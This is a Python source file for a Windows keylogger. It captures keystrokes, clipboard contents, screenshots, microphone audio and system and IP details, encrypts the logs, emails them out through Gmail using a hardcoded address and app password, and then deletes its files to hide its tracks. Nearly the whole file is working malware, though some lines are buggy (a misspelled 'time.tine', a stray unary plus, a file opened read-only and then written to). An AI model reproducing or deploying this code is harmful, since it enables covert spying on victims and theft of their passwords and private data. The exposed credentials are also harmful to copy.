# keylogger.py
# created on 14/4/2023

# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Default control
keys_information = "key_log_txt"

system_information = "systeminfo.txt"

clipboard_information = "clipboard.txt"

audio_information = "audio.wav"
microphone_time = 10

screenshot_information = "screenshot.png"

keys_information_encryption = "encrypted_key_log.txt"
system_information_encryption = "encrypted_system.txt"
clipboard_information_encryption = "encrypted_clipboard.txt"


number_of_iterations_end = 3
time_iteration = 15

email_address = "meomeouwu33@gmail.com"
password = "wlxriufwybkinsip"

username = getpass.getuser()

key = "Vwu1_396jJPabXw0Fh7i_NwWXx6fSCX_BnpluxaOSug="

toaddr = "meomeouwu33@gmail.com"

file_path = "C:\\AdvancedKeylogger\\Project"
extend = "\\"
file_merge = file_path + extend


# Sending email functionality
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_email"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename )

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)


# getting computer information functionality
def computer_information():
    with open(file_path + extend +system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + +public_ip)

        except Exception:
            f.write("Couldn't get public IP address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()


# Gathering the clipboard content functionality
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try: 
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()


# Collecting audio using microphone functionality
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

# Taking screenshots functionality
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


# Keylogger timer functionality
number_of_iterations = 0
currentTime = time.tine()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end: 

    # Logging keys functionality
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False
        
    with Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open (file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_encryption, file_merge + clipboard_information_encryption, file_merge + keys_information_encryption]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'rb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

# Clean up tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
